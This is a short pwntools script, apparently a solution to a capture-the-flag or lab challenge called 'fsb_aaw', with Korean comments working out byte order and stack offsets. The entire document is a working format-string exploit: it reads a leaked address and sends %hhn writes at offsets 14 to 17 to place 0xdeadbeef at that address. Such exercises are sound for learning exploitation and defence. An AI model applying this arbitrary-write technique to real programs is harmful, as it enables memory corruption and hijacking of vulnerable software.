from pwn import *

p = process('./fsb_aaw')

p.recvuntil(b':')
secret = int(p.recvline().strip(), 16)

print("secret:", hex(secret))

# 64정도로 넣을 거라 생각하고 만들면 됨
# 0xdeadbeef
# 0xde, 0xad, 0xbe, 0xef
# 0xad, 0xbe, 0xde, 0xef
# 64? --> 8 * (14 - 6)...
# 시작 지점: 14
# 바이트 order
# 0xef/0xbe/0xad/0xde
# 14/15/16/17
pay = f'%{0xad}c%16$hhn'.encode()
pay += f'%{0xbe-0xad}c%15$hhn'.encode()
pay += f'%{0xde-0xbe}c%17$hhn'.encode()
pay += f'%{0xef-0xde}c%14$hhn'.encode()
pay = pay.ljust(64, b'A')

pay += p64(secret)
pay += p64(secret+1)
pay += p64(secret+2)
pay += p64(secret+3)

p.sendline(pay)
print(p.recvall())